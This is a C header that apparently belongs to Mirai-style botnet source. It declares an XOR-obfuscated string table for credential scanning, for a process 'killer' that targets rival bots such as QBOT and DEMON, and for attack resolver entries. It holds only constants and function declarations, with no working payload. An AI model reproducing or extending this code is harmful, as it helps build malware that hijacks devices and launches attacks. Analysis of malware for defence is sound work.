#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_SCAN_CB_PORT		1

#define TABLE_EXEC_SUCCESS		2

#define TABLE_KILLER_PROC		3
#define TABLE_KILLER_EXE		4
#define TABLE_KILLER_FD			5
#define TABLE_KILLER_TCP		6
#define TABLE_KILLER_MAPS		7

#define TABLE_ATK_RESOLVER		8
#define TABLE_ATK_NSERV			9

#define TABLE_SCAN_OGIN			10
#define TABLE_SCAN_ENTER		11
#define TABLE_SCAN_ASSWORD		12
#define TABLE_SCAN_QUERY		13
#define TABLE_SCAN_RESP			14
#define TABLE_SCAN_NCORRECT		15
#define TABLE_SCAN_ENABLE		16
#define TABLE_SCAN_SYSTEM		17
#define TABLE_SCAN_SHELL		18
#define TABLE_SCAN_SH			19

#define TABLE_MISC_RAND			20
#define TABLE_MISC_DOG			21
#define TABLE_MISC_DOG1			22
#define TABLE_MISC_DOG2			23
#define TABLE_MISC_DOG3			24
#define TABLE_MISC_DOG4			25
#define TABLE_MISC_DOG5			26
#define TABLE_MISC_DOG6			27

#define TABLE_KILLER_MNT		28
#define TABLE_KILLER_ROOT		29
#define TABLE_KILLER_TMP		30
#define TABLE_KILLER_VAR		31
#define TABLE_KILLER_HOME		32

#define TABLE_KILLER_UPX		33
#define TABLE_KILLER_KILL1		34
#define TABLE_KILLER_CMD		35

#define XOR_MEM_NETSLINK		36
#define XOR_MEM_QBOT 			37
#define XOR_MEM_DEMON 			38
#define XOR_MEM_UPX 			39

#define TABLE_SCAN_LINUXSHELL	40


#define TABLE_MAX_KEYS			41

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
